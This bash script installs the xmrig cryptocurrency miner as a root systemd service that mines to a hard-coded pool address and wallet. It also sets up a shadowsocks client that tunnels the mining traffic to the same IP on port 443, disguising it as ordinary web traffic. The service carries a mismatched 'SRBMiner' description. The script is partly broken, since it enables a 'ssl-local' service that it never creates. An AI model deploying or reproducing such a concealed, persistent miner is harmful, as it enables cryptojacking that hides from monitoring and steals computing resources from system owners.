#!/bin/bash
sudo apt install shadowsocks-libev -y
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar xzfv xmrig-6.22.2-linux-static-x64.tar.gz


sudo   cat >/etc/systemd/system/xmrig.service <<EOL
[Unit]
Description=SRBMiner

[Service]
WorkingDirectory=/home/ubuntu/xmrig-6.22.2
ExecStart=/home/ubuntu/xmrig-6.22.2/xmrig -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x --proxy 127.0.0.1:1080 
Restart=always
# Restart service after 10 seconds if the dotnet service crashes:
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=xmrig
User=root

[Install]
WantedBy=multi-user.target
EOL

sudo cat > /etc/systemd/system/ss-local.service <<EOL
[Unit]
Description=Shadowsocks Local Client
After=network.target

[Service]
ExecStart=/usr/bin/ss-local -c /etc/shadowsocks-libev/config.json
Restart=on-failure
RestartSec=10
LimitNOFILE=4096

[Install]
WantedBy=multi-user.target
EOL

cat > /etc/shadowsocks-libev/config.json <<EOL
{
    "server": "114.29.237.94",
    "server_port": 443,
    "local_address": "127.0.0.1",
    "local_port": 1080,
    "password": "abc123",
    "timeout": 300,
    "method": "chacha20-ietf-poly1305",
    "mode": "tcp_and_udp"
}
EOL

sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
sudo systemctl enable ssl-local.service
sudo systemctl start ssl-local.service
sudo systemctl start xmrig.service
